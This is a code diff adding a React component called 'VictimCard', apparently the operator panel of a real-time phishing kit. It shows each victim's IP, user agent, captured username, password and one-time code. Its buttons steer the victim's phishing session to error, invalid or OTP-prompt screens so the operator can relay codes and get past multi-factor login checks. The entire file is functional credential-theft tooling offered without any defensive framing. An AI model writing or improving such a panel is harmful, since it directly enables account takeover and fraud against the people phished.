@@ -1,0 +1,175 @@
+"use client";
+import React from "react";
+// import Link from 'next/link'
+import {
+  Button,
+  Card,
+  CardHeader,
+  CardBody,
+  CardFooter,
+  Divider,
+  Link,
+  Image,
+  Input,
+} from "@nextui-org/react";
+import { data } from "autoprefixer";
+import { revalidatePath } from "next/cache";
+import { Formik, Field, Form, FormikHelpers } from "formik";
+import { useRouter } from "next/router";
+import { toast } from "react-hot-toast";
+import { useState, useEffect } from "react";
+
+export default function VictimCard({
+  id,
+  ip,
+  OTP,
+  username,
+  password,
+  action,
+  user_agent,
+}) {
+  const [curr_OTP, setCurrOTP] = useState(0);
+  useEffect(() => {
+    setCurrOTP(OTP);
+  }, [OTP]);
+
+  const [curr_action, setCurrAction] = useState(0);
+  useEffect(() => {
+    setCurrAction(action);
+  }, [action]);
+
+  const router = useRouter();
+  const sendToError = async () => {
+    try {
+      const res = await fetch(`${process.env.API_URL}/action/${id}/error`, {
+        method: "PUT",
+        cache: "no-cache",
+      });
+    } catch (error) {}
+    setCurrAction("error");
+    toast.success(`Sent ${id} to error`);
+  };
+  const sendToInvalid = async () => {
+    try {
+      const res = await fetch(`${process.env.API_URL}/action/${id}/invalid`, {
+        method: "PUT",
+        cache: "no-cache",
+      });
+    } catch (error) {}
+    setCurrAction("invalid");
+    toast.success(`Sent ${id} to invalid`);
+  };
+  const sendToOTP2 = async () => {
+    try {
+      const res = await fetch(`${process.env.API_URL}/action/${id}/OTP2`, {
+        method: "PUT",
+        cache: "no-cache",
+      });
+    } catch (error) {}
+    setCurrAction("OTP2");
+    toast.success(`Sent ${id} to OTP2`);
+  };
+  const sendToOTP = async () => {
+    try {
+      const res = await fetch(`${process.env.API_URL}/action/${id}/OTP`, {
+        method: "PUT",
+        cache: "no-cache",
+      });
+    } catch (error) {}
+    setCurrAction("OTP");
+    toast.success(`Sent ${id} to OTP`);
+  };
+  const setOTP = async (values, { setSubmitting }) => {
+    try {
+      const res = await fetch(
+        `${process.env.API_URL}/OTP/${id}/${values.OTP}`,
+        { method: "PUT", cache: "no-cache" }
+      );
+      if (JSON.parse(await res.json()).status == "OK") {
+        toast.success(`set OTP ${values.OTP} to ID ${id} `);
+        // setCurrOTP(await fetch(`${process.env.API_URL}/OTP/${id}`,{method: 'GET',cache: "no-cache"}));
+        // useEffect(()=>{
+        setCurrOTP(values.OTP);
+        sendToOTP();
+        // })
+      } else {
+        throw new Error("ERROR from backend");
+      }
+    } catch (error) {
+      toast.error("(╯°□°)╯︵ ┻━┻   " + error);
+    }
+  };
+  return (
+    // <Link href={href} className=''>
+    // {title}
+    // </Link>
+    <Card className="max-w-[600px] bg-slate-800 m-2 rounded-xl content-center ">
+      <CardHeader className="flex gap-3">
+        <div className="flex flex-col text-left">
+          <p className="text-md">
+            <span className="text-sky-500">ID:</span> {id}
+          </p>
+          <p className="text-md">
+            <span className="text-sky-500">IP:</span> {ip}
+          </p>
+          <p className="text-md">
+            <span className="text-sky-500"> user_agent: </span>
+            {user_agent}
+          </p>
+        </div>
+      </CardHeader>
+      <Divider />
+      <CardBody>
+        <p>
+          <span className="text-sky-500">Username:</span> {username}{" "}
+        </p>
+        <p>
+          <span className="text-sky-500">Password:</span> {password}
+        </p>
+        <p>
+          <span className="text-sky-500">Action:</span> {curr_action}
+        </p>
+        <p>
+          <span className="text-sky-500">OTP:</span> {curr_OTP}
+        </p>
+      </CardBody>
+      <Divider />
+      <CardFooter className="flex justify-between content-center">
+        <Button onPress={sendToError} color="danger" className="m-1">
+          Send to error
+        </Button>
+        <Button onPress={sendToInvalid} color="warning" className="m-1">
+          Send to Invalid
+        </Button>
+        <Formik
+          initialValues={{
+            OTP: "",
+          }}
+          onSubmit={setOTP}
+        >
+          <Form className="flex justify-center content-center ">
+            <div className="">
+              <Field
+                id="OTP"
+                name="OTP"
+                placeholder="OTP"
+                type="text"
+                className="form-control h-10  m-1 bg-gray-200 appearance-none border-2 border-gray-200 rounded-l-lg w-full py-2 px-4 text-gray-700 leading-tight focus:outline-none focus:bg-white focus:border-sky-600"
+              />
+            </div>
+            <Button
+              type="submit"
+              color="primary"
+              className="rounded-l-none m-1"
+            >
+              Send
+            </Button>
+          </Form>
+        </Formik>
+        <Button onPress={sendToOTP2} color="default" className="m-1">
+          Send to OTP2
+        </Button>
+      </CardFooter>
+    </Card>
+  );
+}
